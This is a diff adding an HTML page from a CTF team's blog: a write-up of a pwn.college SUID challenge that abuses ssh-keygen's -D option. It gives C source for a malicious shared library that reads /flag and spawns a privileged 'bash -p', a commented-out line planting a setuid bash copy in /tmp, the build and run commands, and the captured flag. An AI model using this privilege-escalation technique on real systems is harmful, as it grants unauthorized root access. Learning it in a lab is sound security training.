@@ -1,0 +1,240 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title> Level51 General program suid lifting power ideas: ssh-keygen - gentlemen | CTFteam </title>
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="referrer" content="no-referrer">
+    <meta name="description" content="" />
+    <meta property="og:site_name" content="gentlemen | CTFteam" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://ge.ntle.men/pwncollege/babysuidlevel51/" />
+    <meta property="og:title" content="Level51 General program suid lifting power ideas: ssh-keygen" />
+    <meta property="og:image" content="https://ge.ntle.men/https://pic1.imgdb.cn/item/6361d91a16f2c2beb153aec1.png" />
+    <meta property="og:description" content="" />
+
+    <meta name="twitter:card" content="summary_large_image" />
+    
+    <meta name="twitter:title" content="Level51 General program suid lifting power ideas: ssh-keygen" />
+    <meta name="twitter:description" content="" />
+    <meta name="twitter:image" content="https://ge.ntle.men/https://pic1.imgdb.cn/item/6361d91a16f2c2beb153aec1.png" />
+
+    <link rel="canonical" href="https://ge.ntle.men/pwncollege/babysuidlevel51/">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha512-MoRNloxbStBcD8z3M/2BmnT+rg4IsMxPkXaGh2zD6LGNNFE80W3onsAhRcMAMrSoyWL9xD7Ert0men7vR8LUZg==" crossorigin="anonymous" />
+
+    <link rel="stylesheet" href="https://ge.ntle.men/css/custom.css" />
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/styles/github-gist.min.css" integrity="sha512-od7JLoOTxM8w/HSKGzP9Kexc20K9p/M2zxSWsd7H1e4Ctf+8SQFtCWEZnW5u6ul5ehSECa5QmOk9ju2nQMmlVA==" crossorigin="anonymous" />
+    
+
+    
+
+    <link rel="shortcut icon"
+        href="https://ge.ntle.men/images/favicon.png">
+
+    
+    <link href="https://ge.ntle.men/index.xml" rel="alternate" type="application/rss+xml" title="gentlemen | CTFteam" />
+    
+</head>
+
+<body>
+    
+    
+<div class="mt-xl header">
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-auto">
+                <a href="https://ge.ntle.men/">
+                    <h1 class="name">Gentlemen</h1>
+                </a>
+            </div>
+        </div>
+
+        <div class="row justify-content-center">
+            <ul class="nav nav-primary">
+                
+                <li class="nav-item">
+                    <a class="nav-link" href="https://ge.ntle.men/">
+                        
+                        Home
+                    </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a class="nav-link" href="https://ge.ntle.men/about/">
+                        
+                        About
+                    </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a class="nav-link" href="https://ge.ntle.men/writeups">
+                        
+                        Writeups
+                    </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a class="nav-link" href="https://pwn4.club/">
+                        
+                        Pikachu
+                    </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a class="nav-link" href="https://github.com/g3nt13m3n">
+                        
+                        Github
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+
+    <div class="content">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-sm-12 col-lg-8">
+                    <h1 class="mx-0 mx-md-4">Level51 General program suid lifting power ideas: ssh-keygen</h1>
+                    <div class="markdown">
+                        
+    <p>This challenge is part of a series of programs that show you how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part!).</p>
+<p>I just set the SUID bit on /usr/bin/ssh-keygen.
+Try to use it to read the flag!</p>
+<h2 id="resolution"><strong>Resolution</strong></h2>
+<h3 id="write-51c-program">Write 51.c program</h3>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#00f">#include</span><span style="color:#00f">&lt;stdio.h&gt;</span><span style="color:#00f">
+</span></span></span><span style="display:flex;"><span><span style="color:#00f">#include</span><span style="color:#00f">&lt;stdlib.h&gt;</span><span style="color:#00f">
+</span></span></span><span style="display:flex;"><span><span style="color:#00f"></span><span style="color:#00f">static</span> <span style="color:#2b91af">void</span> inject() __attribute__((constructor));
+</span></span><span style="display:flex;"><span><span style="color:#2b91af">void</span> C_GetFunctionList(){
+</span></span><span style="display:flex;"><span>printf(<span style="color:#a31515">&#34;euid:%d</span><span style="color:#a31515">\n</span><span style="color:#a31515">&#34;</span>,geteuid());
+</span></span><span style="display:flex;"><span>sendfile(1,open(<span style="color:#a31515">&#34;/flag&#34;</span>,0),0,4096);
+</span></span><span style="display:flex;"><span><span style="color:#008000">//system(&#34;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#008000"></span><span style="color:#2b91af">char</span> *argvv[]={<span style="color:#a31515">&#34;bash&#34;</span>,<span style="color:#a31515">&#34;-p&#34;</span>,NULL};
+</span></span><span style="display:flex;"><span>execvp(<span style="color:#a31515">&#34;/bin/bash&#34;</span>,argvv);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="">`</span>output<span style="">`</span> consists of 41 seemingly random bytes:
+</span></span></code></pre></div><h3 id="compile-and-run-with-the--d-parameter-of-ssh-keygen-to">Compile and run with the -D parameter of ssh-keygen to.</h3>
+<pre tabindex="0"><code>gcc 51.c -shared -o su.os
+/challenge/babysuid_level51
+ssh-keygen -D ./su.os
+</code></pre><h3 id="flag">Flag</h3>
+<div class="figure">
+<p><img src="https://pic1.imgdb.cn/item/6361d91a16f2c2beb153aec1.png" alt=""></p>
+<p class="caption"> Pwncollege <a href="https://dojo.pwn.college/cse365/misuse">challenge</a></p>
+</div>
+<div class="alert alert-success" role="alert">
+pwn.college{QR_J48hl_pS-DKmsdS8KCYtCYkR.QXzkTMskDM1czW}
+</div>
+<h2 id="dilemma">Dilemma</h2>
+<p>You can use this line of c code to query the current execution uid (don&rsquo;t use getuid())</p>
+<pre tabindex="0"><code>printf(&#34;euid:%d\n&#34;,geteuid());
+</code></pre><p>If it is <code>0</code>, it means the current execution permission is root.
+Do not use the <code>system()</code> function to run shell code when using <code>euid=0</code> permissions, otherwise the shell code will be executed with the current uid permissions.</p>
+<pre tabindex="0"><code>//Don&#39;t use this:
+system(&#34;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p&#34;);
+​
+//Use this one:
+char *argvv[]={&#34;bash&#34;,&#34;-p&#34;,NULL};
+execvp(&#34;/bin/bash&#34;,argvv);
+</code></pre><h2 id="knowledge-points">Knowledge Points</h2>
+<ul>
+<li>First of all, ssh-keygen can run any shared library directly with the <code>-D</code> parameter, and if it has a suid, it can run our malicious code to cause a lift, see below for how the shared library is created.</li>
+</ul>
+<p>Usage:</p>
+<pre tabindex="0"><code>ssh-keygen -D ./su.os
+</code></pre><ul>
+<li>
+<p>This can be done using c code <code>sendfile(1,open(&quot;/flag&quot;,0),0,4096);</code> to open the file and send the contents to the standard output for display.</p>
+</li>
+<li>
+<p>Setting the attribute attribute of the c language can be used to make the function run in the preprocessing phase of the program.</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#00f">#include</span><span style="color:#00f">&lt;stdio.h&gt;</span><span style="color:#00f">
+</span></span></span><span style="display:flex;"><span><span style="color:#00f">#include</span><span style="color:#00f">&lt;stdlib.h&gt;</span><span style="color:#00f">
+</span></span></span><span style="display:flex;"><span><span style="color:#00f"></span><span style="color:#00f">static</span> <span style="color:#2b91af">void</span> inject() __attribute__((constructor));
+</span></span><span style="display:flex;"><span><span style="color:#2b91af">void</span> inject(){
+</span></span><span style="display:flex;"><span>printf(<span style="color:#a31515">&#34;euid:%d</span><span style="color:#a31515">\n</span><span style="color:#a31515">&#34;</span>,geteuid());
+</span></span><span style="display:flex;"><span>sendfile(1,open(<span style="color:#a31515">&#34;/flag&#34;</span>,0),0,4096);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>
+<p>The linking methods of c programs include <code>static linking</code> and <code>dynamic linking</code>.</p>
+</li>
+<li>
+<p>gcc can create shared libraries with the <code>-shared</code> parameter. A shared library cannot be run on its own, it is equivalent to a program that must be called by someone else to run. The difference between it and a normal binary program can be seen with the <code>file</code> command. Shared libraries do not have fields like <code>interpreter</code>, that is, they do not have a link interpreter.</p>
+</li>
+<li>
+<p>A series of functions dlopen, dlclose in the <code>&lt;dlfcn.h&gt;</code> header file can be used in the c program to load and run shared libraries, as detailed in.</p>
+</li>
+</ul>
+<h2 id="references">References</h2>
+<p>1.<em><a href="https://b23.tv/b6K6MPr">Basic suid lifting the right of os file injection method.</a></em></p>
+<p>2.<em><a href="https://www.youtube.com/watch?v=14mIjpOXnrM&amp;t=2878s">CSE 466: Computer Systems Security - Connor&rsquo;s Office Hours 08/26/2021</a></em></p>
+
+
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <section id="comments">
+    <div class="py-3 content">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-sm-12 col-lg-8">
+                    <div class="comments">
+                        <script src="https://utteranc.es/client.js" repo=""
+                            issue-term="pathname" label="comment" theme="github-light" crossorigin="anonymous" async>
+                            </script>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+    
+
+
+    
+
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/highlight.min.js" integrity="sha512-TDKKr+IvoqZnPzc3l35hdjpHD0m+b2EC2SrLEgKDRWpxf2rFCxemkgvJ5kfU48ip+Y+m2XVKyOCD85ybtlZDmw==" crossorigin="anonymous"></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/r.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/python.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/stan.min.js" defer></script>
+        
+        <script>
+            window.addEventListener('load', function() {
+                hljs.initHighlighting();
+            }, true);
+        </script>
+    
+
+    
+
+    
+    
+        
+<script src="https://ge.ntle.men/js/math-code.js"></script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+
+    
+</body>
+
+</html>
